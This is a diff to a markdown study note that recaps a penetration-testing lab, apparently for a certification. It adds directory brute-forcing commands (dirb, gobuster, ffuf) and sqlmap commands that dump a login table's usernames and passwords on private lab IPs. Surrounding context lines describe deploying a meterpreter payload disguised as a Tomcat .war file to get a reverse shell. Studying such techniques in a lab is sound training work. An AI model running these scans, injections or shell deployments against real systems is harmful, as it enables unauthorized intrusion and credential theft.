@@ -25,6 +25,8 @@ Hey Hai, This is just a walkthrough and kinda recap of what in learnt during my 
 - Fixing the In Scope
 - Target > Site map tab > Spider this host
 - Try to bypass the login, using intercept or any other means
+- Intruder option and thier positions to attack
+
 #### Scanning and OS Fingerprinting
 - fping -a -g 10.142.111.0/24 2> /dev/null
 - nmap -sn -n 10.142.111.*    [There is probably a host that does not respond to ICMP echo requests, but that has a service listening on the network.]
@@ -32,6 +34,17 @@ Hey Hai, This is just a walkthrough and kinda recap of what in learnt during my 
 #### Nessus
 - Advanced Customized Scan
 - DISCOVERY -> Host Discovery settings -> Use Fast Network Discovery
+#### Dirbuster
+- dirb http://172.16.64.140/project/ -u admin:admin 
+- gobuster dir -t 50 --w /usr/share/wordlists/dirb/common.txt --url http://172.16.64.81/ -x /,php,txt,bak,old,html,xx
+- ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.16.64.81/FUZZ
+#### Sql Injections
+- sqlmap -u http://10.124.211.96/newsdetails.php?id=1 --dbs --dump
+- sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D admin --tables
+- sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D admin -T login --coloumns
+- sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D admin -T login -C username,password,logintime
+- Intercept the request using burp, save it to req.txt
+- sqlmap -r req.txt -p title  -> focusing cookie based sessions and multi-parameter based queries
 
 ### The Black Box Walkthrough's : Box 1
 
@@ -48,8 +61,6 @@ Hey Hai, This is just a walkthrough and kinda recap of what in learnt during my 
 -  rename .elf to .war upload it, delpoy and this file can be relocated at /var/lib/tomcat8/webapps
 -  mv /var/lib/tomcat8/webapps/meter.war /tmp/meter ls /tmp/meter chmod +x /tmp/meter
 -  reverse shell at meterpreter listener
--  Intruder option and thier positions to attack
-
 
 #### Machine 2
 - sudo nmap -Pn -T4 --open -sS -sC -sV --min-rate=1000 --max-retries=3 -p- 172.16.64.140 -v  
